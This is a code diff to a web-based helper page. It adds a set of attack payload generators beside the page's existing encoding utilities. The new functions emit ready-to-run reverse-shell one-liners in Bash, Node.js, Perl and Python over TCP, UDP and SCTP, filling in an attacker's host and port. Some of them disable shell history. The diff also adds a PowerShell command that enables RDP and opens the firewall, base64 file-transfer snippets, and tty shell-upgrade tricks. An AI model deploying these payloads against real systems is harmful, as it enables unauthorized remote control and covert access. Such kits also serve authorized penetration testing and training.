@@ -275,6 +275,10 @@ if (language) {
   display: block;
 }
 
+#function {
+   min-width: 350px;
+}
+
 #result {
   background-color: yellow;
   border: 1px solid black;
@@ -301,7 +305,18 @@ if (language) {
   <option value="URL decoding">
   <option value="Morse code encoding">
   <option value="Morse code decoding">
-  <option value="Bash reverse shell">
+  <option value="Bash TCP reverse shell">
+  <option value="Javascript TCP reverse shell">
+  <option value="Perl TCP reverse shell">
+  <option value="Powershell: Enable RDP access">
+  <option value="Powershell: Base64 to file">
+  <option value="Powershell: File to base64">
+  <option value="Python TCP reverse shell">
+  <option value="Python UDP reverse shell">
+  <option value="Python STCP reverse shell">
+  <option value="Python pty shell upgrade">
+  <option value="TTY shell upgrade">
+  <option value="Script tty trick">
 </datalist>
 <input id="function" type="text" list="functions" placeholder="Select function...">
 <button id="copybutton" onclick="window.getSelection().selectAllChildren(document.getElementById('result')); document.execCommand('copy'); setTimeout(function () { window.getSelection().empty() }, 500);">Copy result to clipboard</button>
@@ -328,40 +343,55 @@ $(function () {
   functions["Morse code encoding"] = function (input) { return MorseCode.encode(input); }
   functions["Morse code decoding"] = function (input) { return MorseCode.decode(input); }
   function shell(input, code) { var args = input.split(':'); if (args[0] && args[1]) { return code.replace("LHOST", args[0]).replace("LPORT", args[1]); } else { return code; } }
-  functions["Bash reverse shell"] = function (input) { return shell(input, "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"); }
+  
+  functions["Bash TCP reverse shell"] = function (input) { return shell(input, "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"); }
 
-  $('input:text').focus(function(){ $(this).val(''); });
-  $('input:text').click(function(){$(this).val(''); });
+  functions["Javascript TCP reverse shell"] = function (input) { return shell(input, '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(LPORT, "LHOST", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();'); }
 
-  $("#input").on('input', function () {
-    var f = $("#function").val();
-    if($("#functions option[value='" + f + "']").length == 0) { $('#result').css("background-color", "red"); $('#result').text("Please select a valid function"); return; }
+  functions["Perl TCP reverse shell"] = function (input) { return shell(input, 'perl -e \x27use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\x27'); }
+
+  functions["Powershell: Enable RDP access"] = function (input) { return 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop";'; }
+
+  functions["Powershell: Base64 to file"] = function (input) { var r = '[IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($base64string));'; var args = input.split(':'); if (args[0] && args[1]) { r = r.replace("$filename", "\x27"+args[0]+"\x27"); r = r.replace("$base64string", "\x27"+args[1]+"\x27"); } return r; }
+
+  functions["Powershell: File to base64"] = function (input) { var r = '[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename));'; if (input) { r = r.replace("$filename", "\x27"+input+"\x27"); } return r; }
+
+  functions["Python TCP reverse shell"] = function (input) { return shell(input, 'python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\x27LHOST\x27,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();exit();"'); }
+
+  functions["Python UDP reverse shell"] = function (input) { return shell(input, 'python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\x27LHOST\x27,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();"'); }
+
+  functions["Python STCP reverse shell"] = function (input) { return shell(input, 'python -c "import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((\x27LHOST\x27,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\x27HISTFILE\x27,\x27/dev/null\x27);pty.spawn([\x27/bin/bash\x27,\x27-i\x27]);s.close();exit();"'); }
+
+  functions["Python pty shell upgrade"] = function (input) { return 'python -c "import pty;pty.spawn(\x27/bin/sh\x27)";' }
+  
+  functions["Script tty trick"] = function (input) { return "script --return -c 'su' /dev/null"; }
+
+  $("input:text").focus(function(){ $(this).val(''); });
+  $("input:text").click(function(){ $(this).val(''); });
+
+  function process(f) {
+    if($("#functions option[value='" + f + "']").length == 0) { $("#result").css("background-color", "red"); $('#result').text("Please select a valid function"); return false; }
     var input = $("#input").val();
     try {
       var result = functions[f](input);
-      $('#result').css("background-color", "yellow");
+      $("#result").css("background-color", "yellow");
     } catch(err) {
       var result = err.message;
-      $('#result').css("background-color", "red");
+      $("#result").css("background-color", "red");
     }
-    $('#result').text(result);
-    $('#result').css("display", "table");
-    
+    if (result) {
+      $("#result").text(result); $("#result").css("display", "table");
+    } else {
+      $("#result").css("display", "none");
+    }
+  }
+
+  $("#input").on("input", function () {
+    process($("#function").val());
   });
 
-  $("#function").on('change', function () {
-    var f = this.value;
-    if($("#functions option[value='" + f + "']").length == 0) { $('#result').css("background-color", "red"); $('#result').text("Please select a valid function"); return; }
-    var input = $("#input").val();
-    try {
-      var result = functions[f](input);
-      $('#result').css("background-color", "yellow");
-    } catch(err) {
-      var result = err.message;
-      $('#result').css("background-color", "red");
-    }
-    $('#result').text(result);
-    $('#result').css("display", "table");
+  $("#function").on("change", function () {
+    process(this.value);
   });
 });
 </script>
